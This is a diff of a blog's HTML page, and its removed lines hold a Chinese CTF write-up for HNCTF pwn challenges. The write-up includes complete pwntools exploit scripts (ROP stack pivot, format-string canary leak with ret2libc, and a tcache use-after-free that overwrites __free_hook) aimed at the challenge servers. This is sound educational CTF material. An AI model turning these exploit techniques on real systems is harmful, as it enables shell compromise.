@@ -19,23 +19,18 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;hnctf_pwn close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以rea">
-<meta property="og:type" content="article">
-<meta property="og:title" content="hnctf_pwn">
-<meta property="og:url" content="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="nyyyddddn">
+<meta property="og:url" content="https://nyyyddddn.github.io/tags/os/index.html">
 <meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;hnctf_pwn close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以rea">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-05-15T10:44:05.000Z">
-<meta property="article:modified_time" content="2024-09-05T13:58:23.581Z">
 <meta property="article:author" content="nyyyddddn">
-<meta property="article:tag" content="ctf writeup">
 <meta name="twitter:card" content="summary">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/null">
     
-    <title>hnctf_pwn · nyyyddddn&#39;s blog</title>
+    <title>nyyyddddn&#39;s blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -222,8 +217,6 @@
         }
     </script>
     
-        <body class="post-body">
-    
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -253,17 +246,6 @@
     </div>
     <!-- toggle banner for post layout -->
     
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">nyyyddddn</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">hnctf_pwn</a>
-            </div>
-        </div>
-    
 </header>
 
         <!-- fixed footer -->
@@ -290,76 +272,24 @@
 
 
 
-    height:50vh;
-
 ">
     
     <!-- 主页  -->
     
-        
-    <!-- 404页  -->
-    
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-                hnctf_pwn
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-                
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
-    
-</div>
-
-                
-                <!-- 文章字数统计 -->
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/05/15</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -489,80 +419,46 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/hnctf_pwn">https://github.com/nyyyddddn/ctf/tree/main/hnctf_pwn</a></p>
-<h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭了标准输出流，直接<code>cat /flag 1&gt;&amp;0</code>就可以了</p>
-<h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以read一次后重启main再调用system就好了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;hnctf.imxbt.cn&quot;</span></span><br><span class="line">PORT = <span class="number">29342</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x2c</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">buf_addr = leak - (<span class="number">0xfff93748</span> - <span class="number">0xfff93710</span>)</span><br><span class="line">success(<span class="string">f&quot;buf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08048639</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line"></span><br><span class="line">payload = p32(read) + p32(vuln) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(<span class="string">b&#x27;sh;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x4</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr</span><br><span class="line">success(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr - (<span class="number">0xffb45f80</span> - <span class="number">0xffb45f4c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(system) + p32(bss) + p32(bss)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h2><p>格式化字符串泄露canary后和ez_pwn一样的流程，不过libc小版本的差异远程打不通，可以用libc searcher解决这个问题</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;hnctf.imxbt.cn&quot;</span></span><br><span class="line">PORT = <span class="number">46515</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./idea&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>,<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line"><span class="comment"># gdb_comm = &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x080486E4</span></span><br><span class="line"><span class="comment"># c</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(p,gdb_comm)</span></span><br><span class="line">sla(<span class="string">&quot;Ok, sounds good. I&#x27;ll give u a gift!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">rl()</span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;bytes of data!&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x0804870D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span></span><br><span class="line">payload += p32(puts) + p32(vuln) + p32(puts_got)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>)</span><br><span class="line">rl()</span><br><span class="line"><span class="comment"># libc_base = u32(r(4)) - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># success(f&quot;libc_base -&gt;&#123;hex(libc_base)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"><span class="comment"># read = libc_base + libc.sym[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">read = libc_base + libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>,<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Ok, sounds good. I&#x27;ll give u a gift!&quot;</span>,<span class="string">&quot;AA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;bytes of data!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span></span><br><span class="line">payload += p32(read) + p32(vuln) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x4</span>) </span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">b&#x27;sh;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>,<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Ok, sounds good. I&#x27;ll give u a gift!&quot;</span>,<span class="string">&quot;AA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;bytes of data!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span></span><br><span class="line">payload += p32(system) + p32(bss) + p32(bss)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="what"><a href="#what" class="headerlink" title="what"></a>what</h2><p>存在uaf，glibc 2.27 打 通过unsortedbin 泄露libc基地址后，打free hook为system然后去free一个binsh内容的堆块就好了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;hnctf.imxbt.cn&quot;</span></span><br><span class="line">PORT = <span class="number">40950</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./what&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your command:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">&quot;Enter your command:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your command:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please enter idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your command:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please enter idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Please enter your content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete()</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base = leak - (<span class="number">0x72b6087ebca0</span> - <span class="number">0x72b608400000</span>) </span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Appetizers-🥕-working"><a href="#Appetizers-🥕-working" class="headerlink" title="Appetizers_🥕[working]"></a>Appetizers_🥕[working]</h2><p>已经知道的信息是，能往libc基地址往后偏移任意位置 用异或的方式写两个字节的数据，写不到seccomp的段，还没有找到劫持控制流的方法，可能和main arena之类的宏观结构有关系？</p>
-
-    </article>
-    <!-- license -->
+                <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
-            <p>Link：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/</a>
-            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">May 15th 2024, 6:44:05 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">September 5th 2024, 9:58:23 pm</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
+        
+        
+        
+        
+            
+        
+        <article class="index-post">
